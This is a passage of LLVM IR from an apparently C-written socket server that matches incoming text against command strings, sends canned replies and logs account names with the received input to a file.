  %2266 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %2265
  %2267 = getelementptr inbounds %struct.account, %struct.account* %2266, i32 0, i32 0
  %2268 = getelementptr inbounds [200 x i8], [200 x i8]* %2267, i64 0, i64 0
  %2269 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %2270 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %2263, i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.191, i64 0, i64 0), i8* %2268, i8* %2269)
  %2271 = load %struct._IO_FILE*, %struct._IO_FILE** %168, align 8
  %2272 = call i32 @fclose(%struct._IO_FILE* %2271)
  br label %2807

2273:                                             ; preds = %2250
  %2274 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %2275 = call i8* @strstr(i8* %2274, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.194, i64 0, i64 0)) #9
  %2276 = icmp ne i8* %2275, null
  br i1 %2276, label %2277, label %2296

2277:                                             ; preds = %2273
  %2278 = load i32, i32* %5, align 4
  %2279 = sext i32 %2278 to i64
  %2280 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %2279
  %2281 = getelementptr inbounds %struct.account, %struct.account* %2280, i32 0, i32 0
  %2282 = getelementptr inbounds [200 x i8], [200 x i8]* %2281, i64 0, i64 0
  %2283 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %2284 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.195, i64 0, i64 0), i8* %2282, i8* %2283)
  %2285 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.196, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.26, i64 0, i64 0))
  store %struct._IO_FILE* %2285, %struct._IO_FILE** %169, align 8
  %2286 = load %struct._IO_FILE*, %struct._IO_FILE** %169, align 8
  %2287 = load i32, i32* %5, align 4
  %2288 = sext i32 %2287 to i64
  %2289 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %2288
  %2290 = getelementptr inbounds %struct.account, %struct.account* %2289, i32 0, i32 0
  %2291 = getelementptr inbounds [200 x i8], [200 x i8]* %2290, i64 0, i64 0
  %2292 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %2293 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %2286, i8* getelementptr inbounds ([87 x i8], [87 x i8]* @.str.197, i64 0, i64 0), i8* %2291, i8* %2292)
  %2294 = load %struct._IO_FILE*, %struct._IO_FILE** %169, align 8
  %2295 = call i32 @fclose(%struct._IO_FILE* %2294)
  br label %2807

2296:                                             ; preds = %2273
  %2297 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %2298 = call i8* @strstr(i8* %2297, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.198, i64 0, i64 0)) #9
  %2299 = icmp ne i8* %2298, null
  br i1 %2299, label %2300, label %2311

2300:                                             ; preds = %2296
  %2301 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2302 = call i32 (i8*, i8*, ...) @sprintf(i8* %2301, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.199, i64 0, i64 0)) #8
  %2303 = load i32, i32* %4, align 4
  %2304 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2305 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2306 = call i64 @strlen(i8* %2305) #9
  %2307 = call i64 @send(i32 %2303, i8* %2304, i64 %2306, i32 16384)
  %2308 = icmp eq i64 %2307, -1
  br i1 %2308, label %2309, label %2310

2309:                                             ; preds = %2300
  store i8* null, i8** %2, align 8
  br label %2816

2310:                                             ; preds = %2300
  br label %2311

2311:                                             ; preds = %2310, %2296
  %2312 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %2313 = call i8* @strstr(i8* %2312, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.200, i64 0, i64 0)) #9
  %2314 = icmp ne i8* %2313, null
  br i1 %2314, label %2315, label %2326

2315:                                             ; preds = %2311
  %2316 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2317 = call i32 (i8*, i8*, ...) @sprintf(i8* %2316, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.201, i64 0, i64 0)) #8
  %2318 = load i32, i32* %4, align 4
  %2319 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2320 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2321 = call i64 @strlen(i8* %2320) #9
  %2322 = call i64 @send(i32 %2318, i8* %2319, i64 %2321, i32 16384)
  %2323 = icmp eq i64 %2322, -1
  br i1 %2323, label %2324, label %2325

2324:                                             ; preds = %2315
  store i8* null, i8** %2, align 8
  br label %2816

2325:                                             ; preds = %2315
  br label %2326

2326:                                             ; preds = %2325, %2311
  %2327 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %2328 = call i8* @strstr(i8* %2327, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.202, i64 0, i64 0)) #9
  %2329 = icmp ne i8* %2328, null
  br i1 %2329, label %2330, label %2341

2330:                                             ; preds = %2326
  %2331 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2332 = call i32 (i8*, i8*, ...) @sprintf(i8* %2331, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.203, i64 0, i64 0)) #8
  %2333 = load i32, i32* %4, align 4
  %2334 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2335 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2336 = call i64 @strlen(i8* %2335) #9
  %2337 = call i64 @send(i32 %2333, i8* %2334, i64 %2336, i32 16384)
  %2338 = icmp eq i64 %2337, -1
  br i1 %2338, label %2339, label %2340

2339:                                             ; preds = %2330
  store i8* null, i8** %2, align 8
  br label %2816

2340:                                             ; preds = %2330
  br label %2341

2341:                                             ; preds = %2340, %2326
  %2342 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %2343 = call i8* @strstr(i8* %2342, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.204, i64 0, i64 0)) #9
  %2344 = icmp ne i8* %2343, null
  br i1 %2344, label %2345, label %2356

2345:                                             ; preds = %2341
  %2346 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2347 = call i32 (i8*, i8*, ...) @sprintf(i8* %2346, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.205, i64 0, i64 0)) #8
  %2348 = load i32, i32* %4, align 4
  %2349 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2350 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2351 = call i64 @strlen(i8* %2350) #9
  %2352 = call i64 @send(i32 %2348, i8* %2349, i64 %2351, i32 16384)
  %2353 = icmp eq i64 %2352, -1
  br i1 %2353, label %2354, label %2355

2354:                                             ; preds = %2345
  store i8* null, i8** %2, align 8
  br label %2816

2355:                                             ; preds = %2345
  br label %2356

2356:                                             ; preds = %2355, %2341
  %2357 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %2358 = call i8* @strstr(i8* %2357, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.206, i64 0, i64 0)) #9
  %2359 = icmp ne i8* %2358, null
  br i1 %2359, label %2360, label %2371

2360:                                             ; preds = %2356
  %2361 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2362 = call i32 (i8*, i8*, ...) @sprintf(i8* %2361, i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.207, i64 0, i64 0)) #8
  %2363 = load i32, i32* %4, align 4
  %2364 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2365 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2366 = call i64 @strlen(i8* %2365) #9
  %2367 = call i64 @send(i32 %2363, i8* %2364, i64 %2366, i32 16384)
  %2368 = icmp eq i64 %2367, -1
  br i1 %2368, label %2369, label %2370

2369:                                             ; preds = %2360
  store i8* null, i8** %2, align 8
  br label %2816

2370:                                             ; preds = %2360
  br label %2371

2371:                                             ; preds = %2370, %2356
  %2372 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %2373 = call i8* @strstr(i8* %2372, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.208, i64 0, i64 0)) #9
  %2374 = icmp ne i8* %2373, null
  br i1 %2374, label %2375, label %2386

2375:                                             ; preds = %2371
  %2376 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2377 = call i32 (i8*, i8*, ...) @sprintf(i8* %2376, i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.207, i64 0, i64 0)) #8
  %2378 = load i32, i32* %4, align 4
  %2379 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2380 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2381 = call i64 @strlen(i8* %2380) #9
  %2382 = call i64 @send(i32 %2378, i8* %2379, i64 %2381, i32 16384)
  %2383 = icmp eq i64 %2382, -1
  br i1 %2383, label %2384, label %2385

2384:                                             ; preds = %2375
  store i8* null, i8** %2, align 8
  br label %2816

2385:                                             ; preds = %2375
  br label %2386

2386:                                             ; preds = %2385, %2371
  %2387 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %2388 = call i8* @strstr(i8* %2387, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.209, i64 0, i64 0)) #9
  %2389 = icmp ne i8* %2388, null
  br i1 %2389, label %2390, label %2401

2390:                                             ; preds = %2386
  %2391 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2392 = call i32 (i8*, i8*, ...) @sprintf(i8* %2391, i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.207, i64 0, i64 0)) #8
  %2393 = load i32, i32* %4, align 4
  %2394 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2395 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2396 = call i64 @strlen(i8* %2395) #9
  %2397 = call i64 @send(i32 %2393, i8* %2394, i64 %2396, i32 16384)
  %2398 = icmp eq i64 %2397, -1
  br i1 %2398, label %2399, label %2400

2399:                                             ; preds = %2390
  store i8* null, i8** %2, align 8
  br label %2816

2400:                                             ; preds = %2390
  br label %2401

2401:                                             ; preds = %2400, %2386
  %2402 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %2403 = call i8* @strstr(i8* %2402, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.210, i64 0, i64 0)) #9
  %2404 = icmp ne i8* %2403, null
  br i1 %2404, label %2405, label %2416

2405:                                             ; preds = %2401
  %2406 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2407 = call i32 (i8*, i8*, ...) @sprintf(i8* %2406, i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.211, i64 0, i64 0)) #8
  %2408 = load i32, i32* %4, align 4
  %2409 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2410 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2411 = call i64 @strlen(i8* %2410) #9
  %2412 = call i64 @send(i32 %2408, i8* %2409, i64 %2411, i32 16384)
  %2413 = icmp eq i64 %2412, -1
  br i1 %2413, label %2414, label %2415

2414:                                             ; preds = %2405
  store i8* null, i8** %2, align 8
  br label %2816

2415:                                             ; preds = %2405
  br label %2416

2416:                                             ; preds = %2415, %2401
  %2417 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %2418 = call i8* @strstr(i8* %2417, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.212, i64 0, i64 0)) #9
  %2419 = icmp ne i8* %2418, null
  br i1 %2419, label %2420, label %2431

2420:                                             ; preds = %2416
  %2421 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2422 = call i32 (i8*, i8*, ...) @sprintf(i8* %2421, i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.213, i64 0, i64 0)) #8
  %2423 = load i32, i32* %4, align 4
  %2424 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2425 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2426 = call i64 @strlen(i8* %2425) #9
  %2427 = call i64 @send(i32 %2423, i8* %2424, i64 %2426, i32 16384)
  %2428 = icmp eq i64 %2427, -1
  br i1 %2428, label %2429, label %2430

2429:                                             ; preds = %2420
  store i8* null, i8** %2, align 8
  br label %2816

2430:                                             ; preds = %2420
  br label %2431

2431:                                             ; preds = %2430, %2416
  %2432 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %2433 = call i8* @strstr(i8* %2432, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.214, i64 0, i64 0)) #9
  %2434 = icmp ne i8* %2433, null
  br i1 %2434, label %2435, label %2446

2435:                                             ; preds = %2431
  %2436 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2437 = call i32 (i8*, i8*, ...) @sprintf(i8* %2436, i8* getelementptr inbounds ([117 x i8], [117 x i8]* @.str.215, i64 0, i64 0)) #8
  %2438 = load i32, i32* %4, align 4
  %2439 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2440 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2441 = call i64 @strlen(i8* %2440) #9
  %2442 = call i64 @send(i32 %2438, i8* %2439, i64 %2441, i32 16384)
  %2443 = icmp eq i64 %2442, -1
  br i1 %2443, label %2444, label %2445

2444:                                             ; preds = %2435
  store i8* null, i8** %2, align 8
  br label %2816

2445:                                             ; preds = %2435
  br label %2446

2446:                                             ; preds = %2445, %2431
  %2447 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %2448 = call i8* @strstr(i8* %2447, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.216, i64 0, i64 0)) #9
  %2449 = icmp ne i8* %2448, null
  br i1 %2449, label %2450, label %2461

2450:                                             ; preds = %2446
  %2451 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2452 = call i32 (i8*, i8*, ...) @sprintf(i8* %2451, i8* getelementptr inbounds ([96 x i8], [96 x i8]* @.str.217, i64 0, i64 0)) #8
  %2453 = load i32, i32* %4, align 4
  %2454 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2455 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2456 = call i64 @strlen(i8* %2455) #9
  %2457 = call i64 @send(i32 %2453, i8* %2454, i64 %2456, i32 16384)
  %2458 = icmp eq i64 %2457, -1
  br i1 %2458, label %2459, label %2460

2459:                                             ; preds = %2450
  store i8* null, i8** %2, align 8
  br label %2816

2460:                                             ; preds = %2450
  br label %2461

2461:                                             ; preds = %2460, %2446
  %2462 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %2463 = call i8* @strstr(i8* %2462, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.218, i64 0, i64 0)) #9
  %2464 = icmp ne i8* %2463, null
  br i1 %2464, label %2465, label %2476

2465:                                             ; preds = %2461
  %2466 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2467 = call i32 (i8*, i8*, ...) @sprintf(i8* %2466, i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.219, i64 0, i64 0)) #8
  %2468 = load i32, i32* %4, align 4
  %2469 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2470 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2471 = call i64 @strlen(i8* %2470) #9
  %2472 = call i64 @send(i32 %2468, i8* %2469, i64 %2471, i32 16384)
  %2473 = icmp eq i64 %2472, -1
  br i1 %2473, label %2474, label %2475

2474:                                             ; preds = %2465
  store i8* null, i8** %2, align 8
  br label %2816

2475:                                             ; preds = %2465
  br label %2476

2476:                                             ; preds = %2475, %2461
  %2477 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %2478 = call i8* @strstr(i8* %2477, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.220, i64 0, i64 0)) #9
  %2479 = icmp ne i8* %2478, null
  br i1 %2479, label %2480, label %2491

2480:                                             ; preds = %2476
  %2481 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2482 = call i32 (i8*, i8*, ...) @sprintf(i8* %2481, i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.221, i64 0, i64 0)) #8
  %2483 = load i32, i32* %4, align 4
  %2484 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2485 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2486 = call i64 @strlen(i8* %2485) #9
  %2487 = call i64 @send(i32 %2483, i8* %2484, i64 %2486, i32 16384)
  %2488 = icmp eq i64 %2487, -1
  br i1 %2488, label %2489, label %2490

2489:                                             ; preds = %2480
  store i8* null, i8** %2, align 8
  br label %2816

2490:                                             ; preds = %2480
  br label %2491

2491:                                             ; preds = %2490, %2476
  %2492 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %2493 = call i8* @strstr(i8* %2492, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.222, i64 0, i64 0)) #9
  %2494 = icmp ne i8* %2493, null
  br i1 %2494, label %2495, label %2506

2495:                                             ; preds = %2491
  %2496 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2497 = call i32 (i8*, i8*, ...) @sprintf(i8* %2496, i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.223, i64 0, i64 0)) #8
  %2498 = load i32, i32* %4, align 4
  %2499 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2500 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2501 = call i64 @strlen(i8* %2500) #9
  %2502 = call i64 @send(i32 %2498, i8* %2499, i64 %2501, i32 16384)
  %2503 = icmp eq i64 %2502, -1
  br i1 %2503, label %2504, label %2505

2504:                                             ; preds = %2495
  store i8* null, i8** %2, align 8
  br label %2816

2505:                                             ; preds = %2495
  br label %2506

2506:                                             ; preds = %2505, %2491
  %2507 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %2508 = call i8* @strstr(i8* %2507, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.224, i64 0, i64 0)) #9
  %2509 = icmp ne i8* %2508, null
  br i1 %2509, label %2510, label %2521

2510:                                             ; preds = %2506
  %2511 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2512 = call i32 (i8*, i8*, ...) @sprintf(i8* %2511, i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.225, i64 0, i64 0)) #8
  %2513 = load i32, i32* %4, align 4
  %2514 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2515 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2516 = call i64 @strlen(i8* %2515) #9
  %2517 = call i64 @send(i32 %2513, i8* %2514, i64 %2516, i32 16384)
  %2518 = icmp eq i64 %2517, -1
  br i1 %2518, label %2519, label %2520

2519:                                             ; preds = %2510
  store i8* null, i8** %2, align 8
  br label %2816

2520:                                             ; preds = %2510
  br label %2521

2521:                                             ; preds = %2520, %2506
  %2522 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %2523 = call i8* @strstr(i8* %2522, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.226, i64 0, i64 0)) #9
  %2524 = icmp ne i8* %2523, null
  br i1 %2524, label %2525, label %2536

2525:                                             ; preds = %2521
  %2526 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2527 = call i32 (i8*, i8*, ...) @sprintf(i8* %2526, i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.227, i64 0, i64 0)) #8
  %2528 = load i32, i32* %4, align 4
  %2529 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2530 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2531 = call i64 @strlen(i8* %2530) #9
  %2532 = call i64 @send(i32 %2528, i8* %2529, i64 %2531, i32 16384)
  %2533 = icmp eq i64 %2532, -1
  br i1 %2533, label %2534, label %2535

2534:                                             ; preds = %2525
  store i8* null, i8** %2, align 8
  br label %2816

2535:                                             ; preds = %2525
  br label %2536

2536:                                             ; preds = %2535, %2521
  %2537 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %2538 = call i8* @strstr(i8* %2537, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.228, i64 0, i64 0)) #9
  %2539 = icmp ne i8* %2538, null
  br i1 %2539, label %2540, label %2551

2540:                                             ; preds = %2536
  %2541 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2542 = call i32 (i8*, i8*, ...) @sprintf(i8* %2541, i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.229, i64 0, i64 0)) #8
  %2543 = load i32, i32* %4, align 4
  %2544 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2545 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2546 = call i64 @strlen(i8* %2545) #9
  %2547 = call i64 @send(i32 %2543, i8* %2544, i64 %2546, i32 16384)
  %2548 = icmp eq i64 %2547, -1
  br i1 %2548, label %2549, label %2550

2549:                                             ; preds = %2540
  store i8* null, i8** %2, align 8
  br label %2816

2550:                                             ; preds = %2540
  br label %2551

2551:                                             ; preds = %2550, %2536
  %2552 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %2553 = call i8* @strstr(i8* %2552, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.230, i64 0, i64 0)) #9
  %2554 = icmp ne i8* %2553, null
  br i1 %2554, label %2555, label %2566

2555:                                             ; preds = %2551
  %2556 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2557 = call i32 (i8*, i8*, ...) @sprintf(i8* %2556, i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.231, i64 0, i64 0)) #8
  %2558 = load i32, i32* %4, align 4
  %2559 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2560 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2561 = call i64 @strlen(i8* %2560) #9
  %2562 = call i64 @send(i32 %2558, i8* %2559, i64 %2561, i32 16384)
  %2563 = icmp eq i64 %2562, -1
  br i1 %2563, label %2564, label %2565

2564:                                             ; preds = %2555
  store i8* null, i8** %2, align 8
  br label %2816

2565:                                             ; preds = %2555
  br label %2566

2566:                                             ; preds = %2565, %2551
  %2567 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %2568 = call i8* @strstr(i8* %2567, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.232, i64 0, i64 0)) #9
  %2569 = icmp ne i8* %2568, null
  br i1 %2569, label %2570, label %2581

2570:                                             ; preds = %2566
  %2571 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2572 = call i32 (i8*, i8*, ...) @sprintf(i8* %2571, i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.233, i64 0, i64 0)) #8
  %2573 = load i32, i32* %4, align 4
  %2574 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2575 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2576 = call i64 @strlen(i8* %2575) #9
  %2577 = call i64 @send(i32 %2573, i8* %2574, i64 %2576, i32 16384)
  %2578 = icmp eq i64 %2577, -1
  br i1 %2578, label %2579, label %2580

2579:                                             ; preds = %2570
  store i8* null, i8** %2, align 8
  br label %2816

2580:                                             ; preds = %2570
  br label %2581

2581:                                             ; preds = %2580, %2566
  %2582 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %2583 = call i8* @strstr(i8* %2582, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.234, i64 0, i64 0)) #9
  %2584 = icmp ne i8* %2583, null
  br i1 %2584, label %2585, label %2596

2585:                                             ; preds = %2581
  %2586 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2587 = call i32 (i8*, i8*, ...) @sprintf(i8* %2586, i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.235, i64 0, i64 0)) #8
  %2588 = load i32, i32* %4, align 4
  %2589 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2590 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2591 = call i64 @strlen(i8* %2590) #9
  %2592 = call i64 @send(i32 %2588, i8* %2589, i64 %2591, i32 16384)
  %2593 = icmp eq i64 %2592, -1
  br i1 %2593, label %2594, label %2595

2594:                                             ; preds = %2585
  store i8* null, i8** %2, align 8
  br label %2816

2595:                                             ; preds = %2585
  br label %2596

2596:                                             ; preds = %2595, %2581
  %2597 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %2598 = call i8* @strstr(i8* %2597, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.236, i64 0, i64 0)) #9
  %2599 = icmp ne i8* %2598, null
  br i1 %2599, label %2600, label %2611

2600:                                             ; preds = %2596
  %2601 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2602 = call i32 (i8*, i8*, ...) @sprintf(i8* %2601, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.237, i64 0, i64 0)) #8
  %2603 = load i32, i32* %4, align 4
  %2604 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2605 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2606 = call i64 @strlen(i8* %2605) #9
  %2607 = call i64 @send(i32 %2603, i8* %2604, i64 %2606, i32 16384)
  %2608 = icmp eq i64 %2607, -1
  br i1 %2608, label %2609, label %2610

2609:                                             ; preds = %2600
  store i8* null, i8** %2, align 8
  br label %2816

2610:                                             ; preds = %2600
  br label %2611

2611:                                             ; preds = %2610, %2596
  %2612 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %2613 = call i8* @strstr(i8* %2612, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.238, i64 0, i64 0)) #9
  %2614 = icmp ne i8* %2613, null
  br i1 %2614, label %2615, label %2626

2615:                                             ; preds = %2611
  %2616 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2617 = call i32 (i8*, i8*, ...) @sprintf(i8* %2616, i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.239, i64 0, i64 0)) #8
  %2618 = load i32, i32* %4, align 4
  %2619 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2620 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2621 = call i64 @strlen(i8* %2620) #9
  %2622 = call i64 @send(i32 %2618, i8* %2619, i64 %2621, i32 16384)
  %2623 = icmp eq i64 %2622, -1
  br i1 %2623, label %2624, label %2625

2624:                                             ; preds = %2615
  store i8* null, i8** %2, align 8
  br label %2816

2625:                                             ; preds = %2615
  br label %2626

2626:                                             ; preds = %2625, %2611
  %2627 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %2628 = call i8* @strstr(i8* %2627, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.240, i64 0, i64 0)) #9
  %2629 = icmp ne i8* %2628, null
  br i1 %2629, label %2630, label %2641

2630:                                             ; preds = %2626
  %2631 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2632 = call i32 (i8*, i8*, ...) @sprintf(i8* %2631, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.241, i64 0, i64 0)) #8
  %2633 = load i32, i32* %4, align 4
  %2634 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2635 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %2636 = call i64 @strlen(i8* %2635) #9
  %2637 = call i64 @send(i32 %2633, i8* %2634, i64 %2636, i32 16384)
